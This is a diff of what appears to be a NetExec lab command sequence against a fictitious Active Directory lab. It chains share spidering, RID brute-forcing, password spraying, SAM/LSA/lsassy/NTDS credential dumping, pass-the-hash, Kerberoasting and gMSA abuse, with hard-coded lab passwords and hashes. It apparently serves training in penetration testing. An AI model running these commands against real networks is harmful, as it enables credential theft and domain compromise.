@@ -1,44 +1,57 @@
-[Jul 07, 2024 - 11:57:25 (CEST)] exegol-netexec (netexec) /workspace # nxc smb 10.0.0.0/24               
-[Jul 07, 2024 - 11:58:48 (CEST)] exegol-netexec (netexec) /workspace # echo '10.0.0.4\n10.0.0.5\n10.0.0.7\n10.0.0.8' | tee -a hosts.txt
-[Jul 07, 2024 - 12:01:10 (CEST)] exegol-netexec (netexec) /workspace # echo '10.0.0.4 babaorum babaorum.rome.local rome.local\n10.0.0.5 village village.armorique.local armorique.local\n10.0.0.7 METRONUM METRONUM.rome.local\n10.0.0.8 REFERENDUM REFERENDUM.rome.local' | tee -a /etc/hosts
-[Jul 07, 2024 - 11:59:45 (CEST)] exegol-netexec (netexec) /workspace # nxc smb hosts.txt -u guest -p '' --shares
-[Jul 07, 2024 - 12:01:59 (CEST)] exegol-netexec (netexec) /workspace # nxc smb 10.0.0.4 -u guest -p '' -M spider_plus
-[Jul 07, 2024 - 12:02:11 (CEST)] exegol-netexec (netexec) /workspace # cat /tmp/nxc_hosted/nxc_spider_plus/10.0.0.4.json          
-[Jul 07, 2024 - 12:05:05 (CEST)] exegol-netexec (netexec) /workspace # nxc smb 10.0.0.4 -u guest -p '' --get-file \\info.txt.txt infos.txt.txt  --share SHAREACCESIX  
-[Jul 07, 2024 - 12:08:10 (CEST)] exegol-netexec (netexec) /workspace # cat infos.txt.txt                                
-[Jul 07, 2024 - 12:08:34 (CEST)] exegol-netexec (netexec) /workspace # nxc smb hosts.txt -u heftepix -p 'BnfMQ9QI81Tz'
-[Jul 07, 2024 - 12:09:09 (CEST)] exegol-netexec (netexec) /workspace # nxc ftp hosts.txt -u 'heftepix' -p 'BnfMQ9QI81Tz'
-[Jul 07, 2024 - 12:09:28 (CEST)] exegol-netexec (netexec) /workspace # nxc ftp 10.0.0.7 -u 'heftepix' -p 'BnfMQ9QI81Tz' --ls
-[Jul 07, 2024 - 12:09:44 (CEST)] exegol-netexec (netexec) /workspace # nxc ftp 10.0.0.7 -u 'heftepix' -p 'BnfMQ9QI81Tz' --ls wineremix      
-[Jul 07, 2024 - 12:09:52 (CEST)] exegol-netexec (netexec) /workspace # nxc ftp 10.0.0.7 -u 'heftepix' -p 'BnfMQ9QI81Tz' --ls wineremix --get plans.txt
-[Jul 07, 2024 - 13:08:56 (CEST)] exegol-netexec (netexec) /workspace # cat plans.txt          
-nxc smb hosts.txt  -u guest -p '' --rid-brute 10000 --log rid-brute.txt
-[Jul 07, 2024 - 12:23:44 (CEST)] exegol-netexec (netexec) /workspace # cat rid-brute.txt | grep User | grep METRONUM | cut -d '\' -f 2 | cut -d ' ' -f 1  | uniq  > user-metronum.lst
-[Jul 07, 2024 - 12:23:53 (CEST)] exegol-netexec (netexec) /workspace # cat user-metronum.lst 
-[Jul 07, 2024 - 12:24:01 (CEST)] exegol-netexec (netexec) /workspace # cat rid-brute.txt | grep User | grep REFERENDUM | cut -d '\' -f 2 | cut -d ' ' -f 1  | uniq  > user-referendum.lst
-[Jul 07, 2024 - 12:24:18 (CEST)] exegol-netexec (netexec) /workspace # cat user-referendum.lst 
-[Jul 07, 2024 - 12:24:21 (CEST)] exegol-netexec (netexec) /workspace # nxc smb 10.0.0.7 -u user-metronum.lst -p 'wUSYIuhhWy!!12OL' --continue-on-success --local-auth 
-[Jul 07, 2024 - 12:26:00 (CEST)] exegol-netexec (netexec) /workspace # nxc smb 10.0.0.7 -u localix -p 'wUSYIuhhWy!!12OL' --local-auth --sam --lsa --dpapi
-[Jul 07, 2024 - 12:28:31 (CEST)] exegol-netexec (netexec) /workspace # nxc smb 10.0.0.7 -u localix -p 'wUSYIuhhWy!!12OL' --local-auth -M lsassy          
-[Jul 07, 2024 - 12:33:39 (CEST)] exegol-netexec (netexec) /workspace # nxc smb 10.0.0.7  -u musculus -H 0c5a8f7d371f7159fe673933401d0109 --dpapi 
-[Jul 07, 2024 - 12:38:48 (CEST)] exegol-netexec (netexec) /workspace # nxc smb hosts.txt   -u lapsus -p 'hC78*K,Zv+z123'       
-[Jul 07, 2024 - 12:38:54 (CEST)] exegol-netexec (netexec) /workspace # nxc smb hosts.txt   -u lapsus -p 'hC78*K,Zv+z123' --laps
-[Jul 07, 2024 - 12:39:22 (CEST)] exegol-netexec (netexec) /workspace # nxc smb 10.0.0.8 -u admin01 -p '{RT5Xv]Xh1Y34n' --local-auth                                    
-[Jul 07, 2024 - 12:40:32 (CEST)] exegol-netexec (netexec) /workspace # nxc smb 10.0.0.8 -u admin01 -p '{RT5Xv]Xh1Y34n' --local-auth -M lsassy
-[Jul 07, 2024 - 12:45:18 (CEST)] exegol-netexec (netexec) /workspace # nxc ldap 10.0.0.4  -u lapsus -p 'hC78*K,Zv+z123' --users
-[Jul 07, 2024 - 12:42:32 (CEST)] exegol-netexec (netexec) /workspace # nxc smb 10.0.0.8 -u admin01 -p '{RT5Xv]Xh1Y34n' --local-auth -M msol    
-[Jul 07, 2024 - 12:43:36 (CEST)] exegol-netexec (netexec) /workspace # nxc smb 10.0.0.4  -u MSOL_80541c18ebaa -p ']x+qdDl^U!u2I=_wW&1EdJ:*sA(APh_R-v?:#335PPD!Lf[_4ui[h)y>sXB{&[$|F+dHnUD2-]4#4ZNgX%dg?1F.B}h.Q)Kb#8(k^oZ_5:O3Aya}a*.2Bc_L;^q!{B%' --ntds
-[Jul 07, 2024 - 12:46:04 (CEST)] exegol-netexec (netexec) /workspace # cat /root/.nxc/logs/babaorum_10.0.0.4_2024-07-07_124339.ntds | grep -iv disabled | cut -d ':' -f4 > hashes-rome.lst
-[Jul 07, 2024 - 12:46:15 (CEST)] exegol-netexec (netexec) /workspace # cat hashes-rome.lst 
-[Jul 07, 2024 - 12:47:22 (CEST)] exegol-netexec (netexec) /workspace # nxc smb 10.0.0.5 -u '' -p '' --users  
-[Jul 07, 2024 - 12:49:42 (CEST)] exegol-netexec (netexec) /workspace # cat users-armorique.log |  awk -F' ' '{print $10}' > users-armorique.lst
-[Jul 07, 2024 - 12:49:57 (CEST)] exegol-netexec (netexec) /workspace # cat users-armorique.lst 
-[Jul 07, 2024 - 12:50:37 (CEST)] exegol-netexec (netexec) /workspace # nxc ldap 10.0.0.5 -u users-armorique.lst -H hashes-rome.lst --continue-on-success
-[Jul 07, 2024 - 12:57:58 (CEST)] exegol-netexec (netexec) /workspace # nxc ldap 10.0.0.5  -u prolix -H  808022bae08938c2a345f3dec9d38277 --kerberoasting kerb.txt
-[Jul 07, 2024 - 12:58:01 (CEST)] exegol-netexec (netexec) /workspace # john --wordlist=`fzf-wordlists` kerb.txt
-[Jul 07, 2024 - 13:01:48 (CEST)] exegol-netexec (netexec) /workspace # nxc smb 10.0.0.5  -u alambix -p 'gaulois-x-toujours'                   
-[Jul 07, 2024 - 13:01:53 (CEST)] exegol-netexec (netexec) /workspace # nxc smb 10.0.0.5  -u alambix -p 'gaulois-x-toujours'  -k 
-[Jul 07, 2024 - 13:06:49 (CEST)] exegol-netexec (netexec) /workspace # nxc ldap 10.0.0.5  -u alambix -p 'gaulois-x-toujours'  -k --bloodhound --dns-server 10.0.0.5 -c All  
-[Jul 07, 2024 - 13:02:09 (CEST)] exegol-netexec (netexec) /workspace # nxc ldap 10.0.0.5  -u alambix -p 'gaulois-x-toujours'  -k --gmsa
-[Jul 07, 2024 - 13:08:44 (CEST)] exegol-netexec (netexec) /workspace # nxc smb 10.0.0.5 -u 'gMSA-obelix$' -H 99bc5b63d68cb72b910bd754af32a236 --ntds
+nxc smb 10.0.0.0/24 --generate-hosts-file
+nxc smb 10.0.0.0/24 --generate-hosts-file hosts
+nxc smb 10.0.0.0/24 --generate-krb5-file krb5.conf
 
+nxc smb hosts.txt -u guest -p '' --shares
+nxc smb 10.0.0.4 -u guest -p '' -M spider_plus
+cat /tmp/nxc_hosted/nxc_spider_plus/10.0.0.4.json
+
+nxc smb 10.0.0.4 -u guest -p '' --get-file \\info.txt.txt infos.txt.txt  --share SHAREACCESIX
+cat infos.txt.txt
+
+nxc ftp hosts.txt -u 'heftepix' -p 'BnfMQ9QI81Tz'
+nxc ftp 10.0.0.7 -u 'heftepix' -p 'BnfMQ9QI81Tz' --ls
+nxc ftp 10.0.0.7 -u 'heftepix' -p 'BnfMQ9QI81Tz' --ls wineremix
+nxc ftp 10.0.0.7 -u 'heftepix' -p 'BnfMQ9QI81Tz' --ls wineremix --get plans.txt
+cat plans.txt
+
+nxc smb hosts.txt  -u guest -p '' --rid-brute 10000 --log rid-brute.txt
+
+cat rid-brute.txt | grep User | grep METRONUM | cut -d '\' -f 2 | cut -d ' ' -f 1  | uniq  > user-metronum.lst
+cat user-metronum.lst
+
+cat rid-brute.txt | grep User | grep REFERENDUM | cut -d '\' -f 2 | cut -d ' ' -f 1  | uniq  > user-referendum.lst
+cat user-referendum.lst
+
+nxc smb 10.0.0.7 -u user-metronum.lst -p 'wUSYIuhhWy!!12OL' --continue-on-success --local-auth
+nxc smb 10.0.0.7 -u localix -p 'wUSYIuhhWy!!12OL' --local-auth --sam --lsa --dpapi
+nxc smb 10.0.0.7 -u localix -p 'wUSYIuhhWy!!12OL' --local-auth -M lsassy
+
+nxc smb 10.0.0.7 -u musculus -H 0c5a8f7d371f7159fe673933401d0109 --dpapi
+
+nxc smb hosts.txt -u lapsus -p 'hC78*K,Zv+z123'
+nxc smb hosts.txt -u lapsus -p 'hC78*K,Zv+z123' --laps
+
+nxc smb 10.0.0.8 -u admin01 -p '{RT5Xv]Xh1Y34n' --local-auth
+nxc smb 10.0.0.8 -u admin01 -p '{RT5Xv]Xh1Y34n' --local-auth -M lsassy
+
+nxc ldap 10.0.0.4  -u lapsus -p 'hC78*K,Zv+z123' --users
+nxc smb 10.0.0.8 -u admin01 -p '{RT5Xv]Xh1Y34n' --local-auth -M msol
+nxc smb 10.0.0.4  -u MSOL_80541c18ebaa -p ']x+qdDl^U!u2I=_wW&1EdJ:*sA(APh_R-v?:#335PPD!Lf[_4ui[h)y>sXB{&[$|F+dHnUD2-]4#4ZNgX%dg?1F.B}h.Q)Kb#8(k^oZ_5:O3Aya}a*.2Bc_L;^q!{B%' --ntds
+cat /root/.nxc/logs/babaorum_10.0.0.4_2024-07-07_124339.ntds | grep -iv disabled | cut -d ':' -f4 > hashes-rome.lst
+cat hashes-rome.lst
+
+nxc smb 10.0.0.5 -u '' -p '' --users
+cat users-armorique.log |  awk -F' ' '{print $10}' > users-armorique.lst
+cat users-armorique.lst
+nxc ldap 10.0.0.5 -u users-armorique.lst -H hashes-rome.lst --continue-on-success
+
+nxc ldap 10.0.0.5  -u prolix -H  808022bae08938c2a345f3dec9d38277 --kerberoasting kerb.txt
+john --wordlist=`fzf-wordlists` kerb.txt
+nxc smb 10.0.0.5  -u alambix -p 'gaulois-x-toujours'
+nxc smb 10.0.0.5  -u alambix -p 'gaulois-x-toujours'  -k
+
+nxc ldap 10.0.0.5  -u alambix -p 'gaulois-x-toujours'  -k --bloodhound --dns-server 10.0.0.5 -c All
+
+nxc ldap 10.0.0.5  -u alambix -p 'gaulois-x-toujours'  -k --gmsa
+nxc smb 10.0.0.5 -u 'gMSA-obelix$' -H 99bc5b63d68cb72b910bd754af32a236 --ntds
